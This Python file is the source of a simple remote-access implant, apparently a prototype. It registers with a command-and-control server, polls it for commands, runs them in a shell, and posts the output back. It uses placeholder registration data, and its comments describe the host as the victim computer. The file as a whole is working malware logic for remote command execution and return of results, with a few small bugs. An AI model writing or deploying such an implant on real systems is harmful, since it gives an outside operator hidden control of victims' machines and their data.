import requests
import subprocess
import hashlib
from urllib.parse import urljoin
import random


class Implant():
    def __init__(self, c2_addr, debug=False, computer_guid=None):
        self.c2_addr = c2_addr
        if computer_guid is not None:
            self.computer_guid = computer_guid
        else:
            self.computer_guid = self._gen_id()
        self.debug = debug

    def _gen_id(self):
        mac_addr = f"00:00:00:00:00:{random.randint(0,255):02X}"
        return hashlib.sha256(mac_addr.encode('utf-8')).hexdigest()

    def _print_debug_request(self, r):
        message = (
            f"[DEBUG] Request Headers: {r.request.headers}\n"
            f"[DEBUG] Request Body: {r.request.body}\n"
            f"[DEBUG] Response Headers: {r.headers}\n"
            f"[DEBUG] Response Body: {r.content}"
        )
        print(message)

    def register(self):
        data = {
            "computer_name": "dummyimplantcomputer",
            "computer_user": "some_user",  # (what user the implant is running as)
            "computer_guid": self._gen_id(),
            "computer_privileges": ['strign1','string2'],  # (that the implant has) - array of strings
            "connecting_ip_address": "10.10.10.10",  # (from the victim computer)
            "session_key": "dummy_session_key",  # (for crypto, eventually)
        }
        r = requests.post(urljoin(self.c2_addr, "register"), json=data)
        if self.debug:
            self._print_debug_request(r)

    def get_command(self):
        data = {
            "computer_guid": self.computer_guid,
        }
        r = requests.post(urljoin(self.c2_addr, "getNextCommand"), json=data)
        if self.debug:
            self._print_debug_request(r)
        res = r.json()
        print(res)
        if not res:
            return None, None, None
        parts = res
        command_id = parts['command_id']
        command_type = parts['command_type']
        command = parts['command_text']
        return command_id, command_type, command

    def run_shell(self, command):
        p = subprocess.run(command, shell=True, capture_output=True)
        return p.stdout

    def return_command(self, command_id, result):
        data = {
            "computer_guid": self.computer_guid,
            "command_id": command_id,
            "result": result,
        }
        r = requests.post(
            urljoin(self.c2_addr, "sendCommandResult"), json=data)
        if self.debug:
            self._print_debug_request(r)

    def get_command_and_run(self):
        command_id, command_type, command = self.get_command()
        if command is None:
            return
        if command_type == "shell":
            result = self.run_shell(command)
        elif command_type == "whoami":
            result = "i am an implant"
        self.return_command(command_id, result)

    def heartbeat(self):
        data = {
            "computer_guid": self.computer_guid,
            "still_active": True,
        }
        r = requests.post(urljoin(self.c2_addr, "heartbeat"), json=data)
        if self.debug:
            self._print_debug_request(r)

    def alert(self, message):
        data = {
            "computer_guid": self.computer_guid,
            "error": message,
        }
        r = requests.post(urljoin(self.c2_addr, "alert"), json=data)
        if self.debug:
            self._print_debug_request(r)


if __name__ == "__main__":
    implant = Implant("http://localhost:5000", debug=True)
